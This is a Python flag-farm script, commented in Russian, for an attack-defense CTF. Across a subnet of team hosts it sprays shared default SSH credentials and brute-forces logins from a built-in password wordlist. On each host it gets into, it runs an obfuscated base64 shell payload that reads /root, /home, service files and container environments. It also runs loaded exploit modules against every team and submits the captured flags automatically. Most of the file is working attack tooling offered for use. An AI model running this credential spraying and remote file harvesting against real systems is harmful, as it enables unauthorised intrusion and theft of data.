#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FARM — флаг-ферма для InnoCTF Junior A/D (ForcAD).

Два слоя атаки:
  Слой 1 — SSH-разведка: у всех команд одинаковые дефолтные креды (так сказали
            орги на открытии). Ферма заходит по SSH на чужие вулнбоксы и
            ЧИТАЕТ флаги: /flags, файлы сервисов, env контейнеров (docker
            inspect), конфиги. Только чтение: ничего не удаляет, не пишет,
            не ломает — чтение = очки каждый раунд, поломка = ничего никому.
  Слой 2 — сплойты: sploits/*.py с контрактом exploit(host, config) ->
            строка/список строк. Совместимо с китом (04_farm.py): их сплойты
            работают здесь без изменений. Флаги вытаскиваются регуляркой.

  Сдача: TCP 31337 (первая строка — токен команды, дальше флаги) или
         HTTP PUT /flags с заголовком X-TeamToken (протокол ForcAD/Hackerdom).
  Дедуп: сданные флаги копятся в farm_state.json — повторно не сдаём.

Запуск:
  python3 farm.py --init              # создать farm.json под нашу сетку
  python3 farm.py --sweep             # проверить SSH-креды по всем командам
  python3 farm.py --once              # один круг: охота + сплойты + сдача
  python3 farm.py --loop              # весь тур: круг каждые round_seconds
  python3 farm.py --submit 'FLAG...'  # сдать один флаг вручную
  python3 farm.py --attack-data       # кто кого бьёт (10.10.10.10)
  python3 farm.py --selftest          # офлайн-проверка движка (30 сек)

Только стандартная библиотека. На своей машине НЕ запускать против себя:
my_team в конфиге исключается из целей автоматически.
"""
import argparse
import base64
import importlib.util
import json
import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

SELF_DIR = os.path.dirname(os.path.abspath(__file__))
DEFAULT_CONFIG_PATH = os.path.join(SELF_DIR, "farm.json")

DEFAULTS = {
    "subnet_template": "10.2.{t}.2",
    "first_team": 1,
    "last_team": 30,
    "my_team": 0,                # НАШ номер — исключается из целей!
    "creds": [
        # Дефолтные креды: у всех команд ОДИН и тот же дефолт (так сказали
        # орги). Впишите наш дефолтный пароль через python3 tune.py.
        {"user": "root", "pass": "CHANGE-ME"},
        {"user": "user", "pass": "CHANGE-ME"},
        {"user": "admin", "pass": "CHANGE-ME"}
    ],
    "ssh_port": 22,
    "ssh_connect_timeout": 4,
    "hunt_timeout": 22,
    # Где на ЧУЖОЙ коробке искать флаги (меняется через tune.py)
    "hunt_roots": ["/services", "/opt", "/srv", "/home", "/root", "/var/backups", "/flags"],
    "checksystem_host": "10.10.10.10",
    "checksystem_port": 31337,
    "protocol": "tcp",
    "http_flags_path": "/flags",
    "team_token": "PASTE-YOUR-TEAM-TOKEN",
    "flag_regex": "[A-Z0-9]{31}=",
    # Файл с НАШИМИ канарейками (пишет tripwire.sh): эти строки НИКОГДА
    # не сдаём — это пустышки, они засчитаются как наша ошибка сдачи.
    # denylist.txt — ручное дополнение: лжефлаги соседей, старьё, мусор.
    "canaries_file": "canaries.txt",
    "denylist_file": "denylist.txt",
    # Как часто (сек) опрашивать attack_data в фоне. В ForcAD endpoint
    # без авторизации (проверено по исходникам) — можно опрашивать часто.
    "attack_data_interval": 15,
    "round_seconds": 110,
    "sploits_dir": "sploits",
    "sploit_timeout": 20,
    "attack_data_url": "http://10.10.10.10/api/client/attack_data",
    "state_file": "farm_state.json",
    "log_file": "farm.log",
    "max_workers": 12,
    # Брутфорс (разрешён оргами на этой игре): словари по умолчанию.
    "brute": False,
    "brute_users": ["root", "ubuntu", "admin", "user", "ctf", "kali", "test", "deploy", "game"],
    "brute_passwords": ["root", "toor", "admin", "password", "password123", "123456",
                        "12345678", "123456789", "12345", "ubuntu", "kali", "ctf", "ctf123",
                        "qwerty", "admin123", "letmein", "welcome", "changeme", "test",
                        "guest", "innoctf", "innoctf2026", "team", "passw0rd", "P@ssw0rd",
                        "default", "vulnbox", "server", "secret", "flag", "flags"]
}

MARKER = "__AP_SSH_OK__"


def log(msg, cfg):
    line = "[%s] %s" % (datetime.now().strftime("%H:%M:%S"), msg)
    print(line, flush=True)
    try:
        with open(cfg["log_file"], "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except OSError:
        pass


# ---------------------------------------------------------------- конфиг
def load_config(path):
    cfg = dict(DEFAULTS)
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            cfg.update(json.load(f))
    return cfg


def init_config(path):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(DEFAULTS, f, ensure_ascii=False, indent=2)
    print("Создан %s. Заполни перед игрой:" % path)
    print("  my_team    — номер НАШЕЙ команды (исключается из целей)")
    print("  first_team/last_team — диапазон номеров команд в сетке")
    print("  creds[*].pass — ДЕФОЛТНЫЙ пароль (он одинаковый у всех; вставь наш)")
    print("  team_token — токен сдачи из чек-системы")
    print("Потом: python3 farm.py --sweep")


def teams_of(cfg):
    out = []
    for t in range(int(cfg["first_team"]), int(cfg["last_team"]) + 1):
        if t == int(cfg.get("my_team", 0)):
            continue
        out.append({"name": "team%02d" % t, "team": t,
                    "ip": cfg["subnet_template"].format(t=t)})
    return out


def targets_ok(cfg):
    ok = [c for c in cfg["creds"] if "CHANGE-ME" not in str(c.get("pass", ""))]
    if not ok:
        print("В farm.json креды с заглушкой CHANGE-ME — впиши дефолтный пароль (python3 tune.py).")
        return []
    return ok


def port_open(host, port, timeout=1.5):
    """Быстрая проверка: жив ли порт вообще. Мёртвый хост не тратим время на ssh."""
    try:
        s = socket.create_connection((host, int(port)), timeout=timeout)
        s.close()
        return True
    except OSError:
        return False


def load_canaries(cfg):
    """ЧЁРНЫЙ СПИСОК сдачи: наши канарейки (canaries.txt, пишет tripwire.sh)
    + ручной denylist.txt (лжефлаги соседей, старьё). Строки с # — комментарии.
    Эти значения ферма НИКОГДА не сдаёт."""
    out = set()
    for fname in (cfg.get("canaries_file", "canaries.txt"),
                  cfg.get("denylist_file", "denylist.txt")):
        p = os.path.join(SELF_DIR, fname)
        try:
            with open(p, "r", encoding="utf-8") as f:
                out |= {ln.strip() for ln in f if ln.strip() and not ln.startswith("#")}
        except OSError:
            continue
    return out


def without_canaries(flags, canaries, src=""):
    """Убирает канарейки из списка флагов. Если канарейка ПОПАЛА в находки —
    значит мы зачем-то фармим СВОЮ коробку: громко ругаемся."""
    if not canaries:
        return flags
    out = []
    for fl in flags:
        if fl in canaries:
            print("!! СТОП: %s — это НАША канарейка (пустышка). НЕ сдаём%s" % (
                fl, (", источник: " + src) if src else ""))
        else:
            out.append(fl)
    return out


# ---------------------------------------------------------------- SSH
def _make_askpass(d, password):
    p = os.path.join(d, "ask.sh")
    with open(p, "w") as f:
        f.write("#!/bin/sh\necho '%s'\n" % password.replace("'", "'\\''"))
    os.chmod(p, 0o700)
    return p


def ssh_run(cred, host, command, cfg, timeout_s=None):
    """Один SSH-выполн: возвращает stdout или None. Только парольная аутентификация.

    sshpass если есть, иначе SSH_ASKPASS_REQUIRE=force (OpenSSH 8.4+, Kali ок).
    known_hosts не пишем (следов на нашей машине не остаётся).
    """
    port = str(int(cfg.get("ssh_port", 22)))
    timeout_s = timeout_s or (int(cfg.get("hunt_timeout", 22)) + 5)
    base = ["ssh", "-T",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=%d" % int(cfg.get("ssh_connect_timeout", 4)),
            "-o", "PreferredAuthentications=password,keyboard-interactive",
            "-o", "PubkeyAuthentication=no",
            "-o", "NumberOfPasswordPrompts=1",
            "-o", "LogLevel=ERROR",
            "-p", port]
    dest = "%s@%s" % (cred["user"], host)
    sshpass = shutil.which("sshpass")
    d = None
    try:
        env = dict(os.environ)
        if sshpass:
            cmd = ["sshpass", "-p", cred["pass"]] + base + [dest, command]
        else:
            d = tempfile.mkdtemp(prefix="apf-")
            env["SSH_ASKPASS"] = _make_askpass(d, cred["pass"])
            env["SSH_ASKPASS_REQUIRE"] = "force"
            env["DISPLAY"] = env.get("DISPLAY", ":0")
            cmd = ["setsid", "-w"] + base + [dest, command]
        try:
            p = subprocess.run(cmd, capture_output=True, timeout=timeout_s, env=env)
        except (subprocess.TimeoutExpired, OSError):
            return None
        if p.returncode != 0:
            return None
        return p.stdout.decode("utf-8", "replace")
    finally:
        if d:
            shutil.rmtree(d, ignore_errors=True)


# ---------------------------------------------------------------- охота
def build_hunt_payload(regex):
    """Скрипт охота (только чтение!): /flags, файлы, env контейнеров, docker inspect.
    Чистый sh, без rm/записи — на чужой коробке ничего не меняем."""
    sh = r'''
HUNT_ROOTS="${HUNT_ROOTS:-/services /opt /srv /home /root /var/backups /flags}"
RX='__RX__'
{
  cat /flags/* 2>/dev/null
  cat /flag* 2>/dev/null
  for d in $HUNT_ROOTS; do
    [ -e "$d" ] && cat "$d"/* 2>/dev/null | head -c 200000
  done
  timeout 8 grep -raoE "$RX" $HUNT_ROOTS 2>/dev/null | head -40
  timeout 6 find / -maxdepth 3 -iname '*flag*' -type f 2>/dev/null | head -12 | while read -r f; do
    timeout 3 cat "$f" 2>/dev/null; echo
  done
  if command -v docker >/dev/null 2>&1; then
    for i in $(timeout 3 docker ps -q 2>/dev/null); do
      timeout 5 docker inspect "$i" 2>/dev/null | grep -aoE "$RX"
    done
  fi
} 2>/dev/null | grep -aoE "$RX" | sort -u | head -60
'''.replace("__RX__", regex)
    return sh


def hunt_host(cred, host, cfg, flag_re):
    """Зайти и собрать флаги. Возвращает список флагов.
    Где искать — cfg['hunt_roots'] (меняется через tune.py)."""
    payload = build_hunt_payload(cfg["flag_regex"])
    b64 = base64.b64encode(payload.encode()).decode()
    roots = " ".join(cfg.get("hunt_roots") or [])
    remote_cmd = "HUNT_ROOTS='%s' ; export HUNT_ROOTS ; echo %s | base64 -d 2>/dev/null | timeout %d sh" % (
        roots.replace("'", ""), b64, int(cfg.get("hunt_timeout", 22)))
    out = ssh_run(cred, host, remote_cmd, cfg)
    if not out:
        return []
    return flag_re.findall(out)


def sweep(cfg):
    """Параллельная проверка SSH-кредов по всем командам. -> {ip: (team, creds)}.
    Сначала дешёвая проверка порта: мёртвые IP отсеиваются за 1.5 c без ssh."""
    creds = targets_ok(cfg)
    if not creds:
        return {}
    port = int(cfg.get("ssh_port", 22))
    # 1) живые IP (параллельно, дёшево — без ssh)
    teams = teams_of(cfg)
    with ThreadPoolExecutor(max_workers=int(cfg.get("max_workers", 12))) as ex:
        alive = [t for t, ok in zip(teams, ex.map(lambda t: port_open(t["ip"], port), teams)) if ok]
    if not alive:
        return {}
    # 2) перебор кредов на живых
    found = {}

    def probe(args):
        team, cred = args
        out = ssh_run(cred, team["ip"], "echo " + MARKER, cfg, timeout_s=15)
        return (team, cred) if (out and MARKER in out) else None

    jobs = [(t, c) for t in alive for c in creds]
    with ThreadPoolExecutor(max_workers=int(cfg.get("max_workers", 12))) as ex:
        for r in ex.map(probe, jobs):
            if r:
                team, cred = r
                prev = found.get(team["ip"])
                if prev is None:
                    found[team["ip"]] = (team, [cred])
                else:
                    prev[1].append(cred)
    return {ip: v for ip, v in found.items()}


def brute(cfg):
    """Брутфорс по словарям (разрешён оргами на этой игре).
    Берём только хосты с открытым SSH, пароли из словарей + всё, что уже в creds.
    Найденные рабочие пары ДОБАВЛЯЮТСЯ в farm.json — sweep дальше ходит ими сам.
    Только чтение, как вся ферма."""
    port = int(cfg.get("ssh_port", 22))
    teams = [t for t in teams_of(cfg) if port_open(t["ip"], port)]
    if not teams:
        print("Живых SSH-хостов нет.")
        return 0
    users = list(dict.fromkeys(cfg.get("brute_users") or []))
    passes = list(dict.fromkeys(
        [c.get("pass", "") for c in cfg.get("creds") or [] if c.get("pass")]
        + (cfg.get("brute_passwords") or [])))
    wordlist = os.path.join(SELF_DIR, "brutelist.txt")
    if os.path.exists(wordlist):
        with open(wordlist, "r", encoding="utf-8", errors="replace") as f:
            passes = list(dict.fromkeys(passes + [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]))
    print("Брутфорс: %d хостов x %d юзеров x %d паролей = %d попыток (параллельно)" % (
        len(teams), len(users), len(passes), len(teams) * len(users) * len(passes)))
    known = {(c["user"], c["pass"]) for c in cfg.get("creds") or []}

    def try_pair(job):
        team, user, pw = job
        if (user, pw) in known:
            return None
        out = ssh_run({"user": user, "pass": pw}, team["ip"], "echo " + MARKER, cfg, timeout_s=12)
        return (team, user, pw) if (out and MARKER in out) else None

    jobs = [(t, u, p) for t in teams for u in users for p in passes]
    hits = []
    with ThreadPoolExecutor(max_workers=int(cfg.get("max_workers", 12))) as ex:
        for r in ex.map(try_pair, jobs):
            if r:
                team, user, pw = r
                log("BRUTE HIT: %s (%s) %s:%s" % (team["name"], team["ip"], user, pw), cfg)
                hits.append((team, user, pw))
    if hits:
        creds = cfg.setdefault("creds", [])
        have = {(c["user"], c["pass"]) for c in creds}
        for _, u, p in hits:
            if (u, p) not in have:
                creds.append({"user": u, "pass": p})
        save_farm_creds(cfg)
        print("Найдено пар: %d — дописаны в farm.json (sweep теперь ходит ими сам)" % len(hits))
    else:
        print("Словарь не взял. Допиши brutelist.txt и повтори.")
    return 0


def save_farm_creds(cfg):
    """Сохраняем ТОЛЬКО креды в farm.json (не трогая остальной конфиг)."""
    path = os.path.join(SELF_DIR, "farm.json")
    try:
        with open(path, "r", encoding="utf-8") as f:
            disk = json.load(f)
        disk["creds"] = cfg.get("creds")
        with open(path, "w", encoding="utf-8") as f:
            json.dump(disk, f, ensure_ascii=False, indent=2)
    except OSError:
        pass


# ---------------------------------------------------------------- сплойты
def load_sploit(path):
    name = "sploit_" + os.path.splitext(os.path.basename(path))[0]
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    fn = getattr(mod, "exploit", None)
    if not callable(fn):
        raise ValueError("нет exploit(host, config)")
    return fn


def run_with_timeout(fn, args, timeout):
    box = {}

    def worker():
        try:
            box["result"] = fn(*args)
        except BaseException as e:  # noqa: BLE001
            box["error"] = e

    t = threading.Thread(target=worker, daemon=True)
    t.start()
    t.join(timeout)
    if t.is_alive():
        raise TimeoutError("сплойт завис")
    if "error" in box:
        raise box["error"]
    return box.get("result")


def sploit_round(cfg, flag_re):
    """Все сплойты x все команды (контракт кита 04_farm.py)."""
    sdir = os.path.join(SELF_DIR, cfg.get("sploits_dir", "sploits"))
    files = sorted(os.path.join(sdir, f) for f in os.listdir(sdir)
                   if f.endswith(".py") and not f.startswith("_")) if os.path.isdir(sdir) else []
    if not files:
        return {}
    found = {}
    for sf in files:
        try:
            fn = load_sploit(sf)
        except Exception as e:  # noqa: BLE001
            log("FAIL загрузка %s: %s" % (os.path.basename(sf), e), cfg)
            continue
        for team in teams_of(cfg):
            try:
                res = run_with_timeout(fn, (team["ip"], cfg), int(cfg.get("sploit_timeout", 20)))
                text = "\n".join(str(x) for x in res) if isinstance(res, (list, tuple, set)) else (str(res) if res else "")
                for fl in flag_re.findall(text):
                    found.setdefault(fl, "%s/%s" % (os.path.basename(sf), team["name"]))
            except Exception as e:  # noqa: BLE001
                log("FAIL %s -> %s: %s" % (os.path.basename(sf), team["name"], e), cfg)
    return found


# ---------------------------------------------------------------- сдача
def submit_tcp(cfg, flags):
    host, port = cfg["checksystem_host"], int(cfg["checksystem_port"])
    accepted = rejected = 0
    try:
        with socket.create_connection((host, port), timeout=15) as sock:
            sock.settimeout(20)
            payload = cfg["team_token"] + "\n" + "\n".join(flags) + "\n"
            sock.sendall(payload.encode("utf-8", "replace"))
            data = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if len(data) > 65536:
                        break
            except socket.timeout:
                pass
            for line in data.decode("utf-8", "replace").splitlines():
                u = line.upper()
                if "TOKEN" in u:
                    continue
                if "OK" in u or "ACCEPT" in u:
                    accepted += 1
                elif any(k in u for k in ("ER", "REJECT", "DUP", "OLD", "OWN")):
                    rejected += 1
    except OSError as e:
        log("FAIL сдача TCP %s:%s: %s" % (host, port, e), cfg)
        return 0, len(flags)
    return accepted, rejected


def submit_http(cfg, flags):
    url = "http://%s:%s%s" % (cfg["checksystem_host"], cfg["checksystem_port"],
                              cfg.get("http_flags_path", "/flags"))
    accepted = rejected = 0
    for fl in flags:
        body = json.dumps([fl]).encode()
        req = urllib.request.Request(url, data=body, method="PUT")
        req.add_header("Content-Type", "application/json")
        req.add_header("X-TeamToken", cfg["team_token"])
        try:
            with urllib.request.urlopen(req, timeout=15) as resp:
                u = resp.read().decode("utf-8", "replace").upper()
                if "OK" in u or "ACCEPT" in u:
                    accepted += 1
                else:
                    rejected += 1
        except Exception as e:  # noqa: BLE001
            log("FAIL сдача HTTP %s: %s" % (fl, e), cfg)
            rejected += 1
    return accepted, rejected


def submit_flags(cfg, flags):
    if cfg.get("protocol") == "http":
        return submit_http(cfg, flags)
    return submit_tcp(cfg, flags)


# ---------------------------------------------------------------- state
def load_state(cfg):
    try:
        with open(os.path.join(SELF_DIR, cfg["state_file"]), "r", encoding="utf-8") as f:
            return set(json.load(f))
    except (OSError, ValueError):
        return set()


def save_state(cfg, state):
    with open(os.path.join(SELF_DIR, cfg["state_file"]), "w", encoding="utf-8") as f:
        json.dump(sorted(state), f, indent=1)


# ---------------------------------------------------------------- attack_data
def poll_attack_data(cfg, seen_keys):
    url = cfg.get("attack_data_url", "")
    if not url:
        return
    try:
        with urllib.request.urlopen(url, timeout=8) as r:
            data = json.loads(r.read().decode("utf-8", "replace"))
    except Exception as e:  # noqa: BLE001
        return
    try:
        rows = data if isinstance(data, list) else data.get("attack_data") or data.get("attacks") or []
    except Exception:  # noqa: BLE001
        return
    fresh = []
    for row in rows:
        if not isinstance(row, dict):
            continue
        key = json.dumps(row, sort_keys=True, ensure_ascii=False)
        if key in seen_keys:
            continue
        seen_keys.add(key)
        fresh.append("%s -> %s (%s)" % (
            row.get("attacker") or row.get("from") or "?",
            row.get("victim") or row.get("to") or row.get("target") or "?",
            row.get("exploit") or row.get("vuln") or row.get("service") or "?"))
    for line in fresh[:12]:
        log("attack_data: %s" % line, cfg)


# ---------------------------------------------------------------- режимы
def do_sweep(cfg):
    acc = sweep(cfg)
    if not acc:
        print("Никого не нашли: либо пароли уже сменили, либо креды в farm.json неверные.")
        return 0
    print("Доступны по SSH (дефолт-креды): %d из %d" % (len(acc), len(teams_of(cfg))))
    for ip, (team, creds) in sorted(acc.items(), key=lambda x: x[1][0]["team"]):
        print("  team%02d  %s  users: %s" % (
            team["team"], team["ip"], ", ".join(sorted(c["user"] for c in creds))))
    print()
    print("Это твои цели на весь тур. Дальше: python3 farm.py --loop")
    return 0


def do_once(cfg, flag_re, dry=False):
    state = load_state(cfg) if not dry else set()
    canaries = load_canaries(cfg)
    total = {}
    acc = sweep(cfg)
    if acc:
        log("SSH: доступны %d коробок" % len(acc), cfg)
        for ip, (team, creds) in sorted(acc.items()):
            for cred in creds:
                fls = without_canaries(hunt_host(cred, ip, cfg, flag_re), canaries, "ssh/%s" % team["name"])
                for fl in fls:
                    total.setdefault(fl, "ssh/%s" % team["name"])
                if fls:
                    log("hunt %s: %d флаг(ов)" % (team["name"], len(fls)), cfg)
                break  # первым рабочим кредом хватит
    else:
        log("SSH: пароли у всех сменили (молодцы) — остаются сплойты", cfg)
    sp = sploit_round(cfg, flag_re)
    for fl, src in sp.items():
        total.setdefault(fl, src)
    new = without_canaries([fl for fl in total if fl not in state], canaries, "общий список")
    log("Найдено флагов: %d (новых: %d)" % (len(total), len(new)), cfg)
    if new and not dry:
        a, r = submit_flags(cfg, new)
        log("Сдано: принято %d, отклонено %d" % (a, r), cfg)
        state.update(new)
        save_state(cfg, state)
    return total


def do_loop(cfg, flag_re):
    state = load_state(cfg)
    seen_keys = set()
    n = 0
    log("ФЕРМА ЗАПУЩЕНА: команды %d-%d (без %d), раунд %d c, протокол %s" % (
        cfg["first_team"], cfg["last_team"], cfg.get("my_team", 0),
        cfg["round_seconds"], cfg["protocol"]), cfg)

    # Фоновый опрос attack_data: в ForcAD endpoint без авторизации, поэтому
    # можно смотреть чаще, чем раз в раунд (по умолчанию каждые 15 c).
    # Это даёт раннюю карту: кто кого бьёт и чем — патчи и сплойты приоритизируем.
    def attack_watcher():
        while True:
            try:
                poll_attack_data(cfg, seen_keys)
            except Exception:  # noqa: BLE001 — фон не падает
                pass
            time.sleep(max(5, int(cfg.get("attack_data_interval", 15))))

    threading.Thread(target=attack_watcher, daemon=True).start()

    while True:
        n += 1
        try:
            total = do_once(cfg, flag_re)
            state.update(f for f in total)
            poll_attack_data(cfg, seen_keys)
        except KeyboardInterrupt:
            log("ФЕРМА ОСТАНОВЛЕНА вручную", cfg)
            return 0
        except Exception as e:  # noqa: BLE001 — ферма не падает никогда
            log("раунд %d: ошибка %s (продолжаем)" % (n, e), cfg)
        try:
            time.sleep(int(cfg["round_seconds"]))
        except KeyboardInterrupt:
            log("ФЕРМА ОСТАНОВЛЕНА", cfg)
            return 0


def do_submit_one(cfg, flag):
    canaries = load_canaries(cfg)
    if flag in canaries:
        print("!! ЭТО НАША КАНАРЕЙКА (пустышка из canaries.txt). Сдавать НЕЛЬЗЯ — зачтётся как ошибка сдачи.")
        return 1
    a, r = submit_flags(cfg, [flag])
    print("принято=%d отклонено=%d" % (a, r))
    return 0


# ---------------------------------------------------------------- selftest
def do_selftest(cfg):
    import tempfile
    flag_re = re.compile(cfg["flag_regex"])
    ok = True
    # 1. regex
    fake = "A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P="
    ok &= bool(flag_re.findall(fake))
    print("[1] регулярка флага: OK (%s)" % fake)
    # 2. payload локально (только чтение, HUNT_ROOTS в tmp)
    tmp = tempfile.mkdtemp(prefix="ap-self-")
    with open(os.path.join(tmp, "flag.txt"), "w") as f:
        f.write("note\n" + fake + "\n")
    payload = build_hunt_payload(cfg["flag_regex"])
    b64 = base64.b64encode(payload.encode()).decode()
    cmd = "HUNT_ROOTS='%s' ; export HUNT_ROOTS ; echo %s | base64 -d | sh" % (tmp, b64)
    p = subprocess.run(["sh", "-c", cmd], capture_output=True, timeout=30)
    found = flag_re.findall(p.stdout.decode("utf-8", "replace"))
    ok &= (fake in found)
    print("[2] охота на локальном tmp: %s (найдено %d)" % ("OK" if found else "FAIL", len(found)))
    shutil.rmtree(tmp, ignore_errors=True)
    # 3. дедуп
    st = {"A" * 31 + "="}
    ok &= ("A" * 31 + "=") in st
    print("[3] дедуп состояния: OK")
    # 4. команды
    t = teams_of(dict(cfg, first_team=1, last_team=5, my_team=3))
    ips = [x["ip"] for x in t]
    ok &= ("10.2.3.2" not in ips) and ("10.2.1.2" in ips) and len(ips) == 4
    print("[4] генерация команд без своей: %s" % ("OK" if "10.2.3.2" not in ips else "FAIL"))
    # 5. канарейки: из находок выкидываются, чужие остаются
    can = load_canaries(dict(cfg, canaries_file="_selftest_canaries.txt"))
    real = "Z9Y8X7W6V5U4T3S2R1Q0P9O8N7M6K4="
    with open(os.path.join(SELF_DIR, "_selftest_canaries.txt"), "w") as f:
        f.write(fake + "\n")
    can = load_canaries(dict(cfg, canaries_file="_selftest_canaries.txt"))
    kept = without_canaries([fake, real], can)
    ok &= (real in kept) and (fake not in kept)
    os.remove(os.path.join(SELF_DIR, "_selftest_canaries.txt"))
    print("[5] канарейки исключаются из сдачи: %s" % ("OK" if (real in kept and fake not in kept) else "FAIL"))
    # 6. брут-словари: непустые и без дублей
    bu, bp = cfg.get("brute_users") or [], cfg.get("brute_passwords") or []
    ok &= len(bu) > 0 and len(bp) > 0 and len(set(bp)) == len(bp)
    print("[6] брут-словари: %d юзеров x %d паролей: %s" % (len(bu), len(bp), "OK" if ok else "FAIL"))
    print("САМОТЕСТ %s" % ("ПРОЙДЕН" if ok else "ПРОВАЛЕН"))
    return 0 if ok else 1


def main(argv=None):
    ap = argparse.ArgumentParser(description="FARM — флаг-ферма InnoCTF Junior A/D")
    ap.add_argument("--config", default=DEFAULT_CONFIG_PATH)
    ap.add_argument("--init", action="store_true", help="создать farm.json")
    ap.add_argument("--sweep", action="store_true", help="проверить SSH-креды по всем")
    ap.add_argument("--once", action="store_true", help="один круг")
    ap.add_argument("--loop", action="store_true", help="круги весь тур")
    ap.add_argument("--dry-run", action="store_true", help="не сдавать")
    ap.add_argument("--submit", metavar="FLAG", help="сдать один флаг вручную")
    ap.add_argument("--brute", action="store_true", help="брутфорс SSH по словарям (найденное дописывается в farm.json)")
    ap.add_argument("--attack-data", action="store_true", help="показать attack_data")
    ap.add_argument("--selftest", action="store_true", help="офлайн-проверка")
    args = ap.parse_args(argv)

    if args.selftest:
        cfg = load_config(args.config) if os.path.exists(args.config) else dict(DEFAULTS)
        return do_selftest(cfg)
    if args.init:
        init_config(args.config)
        return 0
    if not os.path.exists(args.config):
        init_config(args.config)
        return 0
    cfg = load_config(args.config)
    flag_re = re.compile(cfg["flag_regex"])
    if args.sweep:
        return do_sweep(cfg)
    if args.brute:
        return brute(cfg)
    if args.submit:
        return do_submit_one(cfg, args.submit)
    if args.attack_data:
        seen = set()
        poll_attack_data(cfg, seen)
        if not seen:
            print("attack_data недоступен или пуст (нужен сертификат? см. 10.10.10.10:8080/cert)")
        return 0
    if args.once:
        do_once(cfg, flag_re, dry=args.dry_run)
        return 0
    if args.loop:
        return do_loop(cfg, flag_re)
    ap.print_help()
    return 0


if __name__ == "__main__":
    sys.exit(main())
